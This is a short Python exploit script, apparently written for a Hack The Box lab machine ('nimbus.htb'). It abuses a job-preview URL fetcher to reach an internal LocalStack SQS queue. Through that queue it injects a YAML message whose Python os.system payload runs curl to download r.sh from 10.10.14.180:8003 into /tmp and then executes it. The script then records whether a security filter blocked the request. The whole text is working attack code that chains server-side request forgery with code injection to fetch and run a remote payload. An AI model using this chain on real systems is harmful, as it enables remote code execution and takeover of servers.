import requests

LOCALSTACK = "172.18.0.2:4566"
QUEUE_URL = f"http://{LOCALSTACK}/<REDACTED_ACCOUNT_ID>/nimbus-jobs"

bootstrap = '__import__("os").system("curl 10.10.14.180:8003/r.sh -o /tmp/r3.sh; sh /tmp/r3.sh")'
yaml_body = "script: '" + bootstrap + "'"
print("YAML message body:", yaml_body)

url = (
    f"http://{LOCALSTACK}/?Action=SendMessage&QueueUrl={QUEUE_URL}"
    f"&MessageBody={yaml_body}&Version=2012-11-05&x=.yaml"
)
print("URL:", url)

r = requests.post("http://nimbus.htb/jobs/preview", data={"url": url}, timeout=20)
verdict = "BLOCKED" if "Security policy" in r.text else ("FETCHED" if "Fetched:" in r.text else "OTHER")
print("verdict:", verdict)
open("http/E30_sqs_correct_response.txt", "w").write(r.text)
